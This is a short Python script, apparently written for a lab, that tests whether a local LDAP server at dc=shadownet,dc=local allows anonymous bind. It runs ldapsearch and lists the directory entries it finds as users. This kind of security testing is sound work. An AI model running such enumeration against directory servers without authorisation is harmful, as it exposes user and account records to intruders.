import os
import sys

TARGET = "ldap://localhost:389"
BASE_DN = "dc=shadownet,dc=local"

def exploit_ldap():
    print(f"[*] Testing LDAP Anonymous Bind on {TARGET}...")
    # Using ldapsearch CLI tool directly as it's most reliable for quick tests
    try:
        # Check if ldapsearch is installed
        if os.system("command -v ldapsearch > /dev/null") != 0:
            print("[-] Error: 'ldapsearch' command not found on host. Please install it (brew install openldap).")
            return

        print("[*] Querying all records...")
        cmd = f'ldapsearch -x -H {TARGET} -b "{BASE_DN}"'
        output = os.popen(cmd).read()
        
        if "dn: " in output:
            print("[+] Success! Anonymous bind allowed.")
            users = [line for line in output.splitlines() if line.startswith("cn: ")]
            print(f"[+] Found {len(users)} entries:")
            for user in users:
                print(f"    - {user.replace('cn: ', '')}")
        else:
            print("[-] LDAP query returned no results. Anonymous bind might be disabled or service is down.")
            
    except Exception as e:
        print(f"[-] LDAP test failed: {e}")

if __name__ == "__main__":
    exploit_ldap()
